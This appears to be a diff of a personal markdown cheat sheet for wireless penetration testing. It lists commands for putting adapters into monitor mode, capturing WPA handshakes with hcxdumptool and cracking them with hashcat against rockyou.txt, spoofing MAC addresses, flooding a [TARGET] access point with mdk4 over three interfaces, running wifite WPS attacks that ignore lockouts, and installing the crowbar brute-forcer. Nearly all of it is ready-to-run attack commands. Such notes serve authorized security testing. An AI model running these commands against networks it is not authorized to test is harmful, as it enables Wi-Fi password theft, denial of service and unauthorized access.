@@ -87,52 +87,42 @@
   
 ### airmon-ng
     sudo airmon-ng check kill
-    sudo airmon-ng start wlan1
+    sudo airmon-ng start wlan0
     sudo iwconfig
-    sudo airodump-ng -c 9 wlan1mon
+    sudo airodump-ng -c 9 wlan0mon
     sudo airodump-ng wlan1mon
-    
 ### kismet
     git clone https://www.kismetwireless.net/git/kismet.git 
-    
     sudo apt install build-essential git libwebsockets-dev pkg-config zlib1g-dev libnl-3-dev libnl-genl-3-dev /
     / libcap-dev libpcap-dev libnm-dev libdw-dev libsqlite3-dev libprotobuf-dev libprotobuf-c-dev protobuf-compiler /
     / protobuf-c-compiler libsensors4-dev libusb-1.0-0-dev python3 python3-setuptools python3-protobuf /
     python3-requests python3-numpy python3-serial python3-usb python3-dev python3-websockets librtlsdr0 /
     / libubertooth-dev libbtbb-dev libmicrohttpd-dev  
-    
     cd kismet
     ./configure
     make
-    sudo usermod -aG kismet $USER
-    
-# Probequest
+    sudo usermod -aG kismet $USER   
+### Probequest
     sudo pip3 install --upgrade probequest    
     sudo airmon-ng start wlan1
     sudo probequest -i wlan1mon 
-    sudo airodump-ng wlan1mon
-    
-# hcxdump / hcxtools
+    sudo airodump-ng wlan1mon   
+### hcxdump / hcxtools
     git clone https://github.com/ZerBea/hcxdumptool.git
     cd hcxdumptool
     make
     sudo make install
     sudo apt-get install libcurl4-openssl-dev libssl-dev pkg-config zlib1g-dev
-    
     git clone https://github.com/ZerBea/hcxtools.git
     cd 
     make
     sudo make install
-   
-    hcxdumptool -i wlan1 -o xname.pcapng --enable_status=1 
+    hcxdumptool -i wlan0 -o xname.pcapng --enable_status=1 
     hcxpcaptool -E xname-essid -I xidentity -U xusers xname.pcapng -o xname-out
-    
     hashcat -m 22000 xname-out -a 0 -w 3 -d 2 'rockyou.txt'
-    
- ### seclists
+### seclists
     sudo apt -y install seclists
-    
- ### wifi interface settings
+### wifi interface settings
     iwconfig
     airmon-ng check kill
     ifconfig wlan0 down
@@ -146,8 +136,7 @@
     macchanger -a wlan0mon
     ifconfig wlan0mon up
 ### mdk4  
-``` sudo apt install mdk4
-    
+    sudo apt install mdk4    
     ifconfig wlan0 down
     iw phy1 interface add mon0 type monitor
     iw phy1 interface add mon1 type monitor
@@ -158,8 +147,7 @@
     ifconfig mon2 up
     mdk4 mon0 e -t [TARGET] -s 100
     mdk4 mon1 e -t [TARGET] -s 100
-    mdk4 mon2 e -t [TARGET] -s 100 
-```     
+    mdk4 mon2 e -t [TARGET] -s 100    
 ### wpa supplicant
 ``` vim /etc/wpa_supplicant.conf
     ctrl_interface=/var/run/wpa_supplicant
@@ -173,9 +161,8 @@
 ```
 ### wifite
     wifite --wps --ignore-locks
-
 ### crowbar
 ``` apt install -y nmap openvpn freerdp2-x11 tigervnc-viewer python3 python3-pip
     git clone https://github.com/galkan/crowbar
     cd crowbar/
-    pip3 install -r requirements.txt ```
+    pip3 install -r requirements.txt
